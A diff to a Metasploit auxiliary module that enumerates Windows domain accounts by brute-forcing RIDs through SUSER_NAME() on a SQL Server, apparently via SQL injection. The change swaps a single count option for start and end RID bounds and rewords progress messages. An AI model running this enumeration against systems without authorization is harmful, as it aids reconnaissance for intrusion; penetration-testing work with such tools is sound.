@@ -33,12 +33,13 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
     [
-      OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 3000])
+      OptInt.new('START_RID', [true, 'RID to start fuzzing at.', 500]),
+      OptInt.new('END_RID', [true, 'RID to stop fuzzing at.', 3000])
     ], self.class)
   end
 
   def run
-    print_status("#{peer} - Grabbing the server and domain name...")
+    print_status("#{peer} - Grabbing the SQL Server name and domain...")
     db_server_name = get_server_name
     if db_server_name.nil?
       print_error("#{peer} - Unable to grab the server name")
@@ -71,7 +72,8 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Get a list of windows users, groups, and computer accounts using SUSER_NAME()
-    print_status("#{peer} - Brute forcing #{datastore['FuzzNum']} RIDs through the SQL Server, be patient...")
+    total_rids = datastore['END_RID'] - datastore['START_RID']
+    print_status("#{peer} - Brute forcing #{total_rids} RIDs via SQL injection, be patient...")
     domain_users = get_win_domain_users(windows_domain_sid)
     if domain_users.nil?
       print_error("#{peer} - Sorry, no Windows domain accounts were found, or DC could not be contacted.")
@@ -172,11 +174,12 @@ class Metasploit3 < Msf::Auxiliary
 
     windows_logins = []
 
+    total_rids = datastore['END_RID'] - datastore['START_RID']
     # Fuzz the principal_id parameter (RID in this case) passed to the SUSER_NAME function
-    (500..datastore['FuzzNum']).each do |principal_id|
-
+    (datastore['START_RID']..datastore['END_RID']).each do |principal_id|
+      rid_diff = principal_id - datastore['START_RID']
       if principal_id % 100 == 0
-        print_status("#{peer} - Querying SID #{principal_id} of #{datastore['FuzzNum']}")
+        print_status("#{peer} - #{rid_diff} of #{total_rids } RID queries complete")
       end
 
        user_sid = build_user_sid(domain_sid, principal_id)
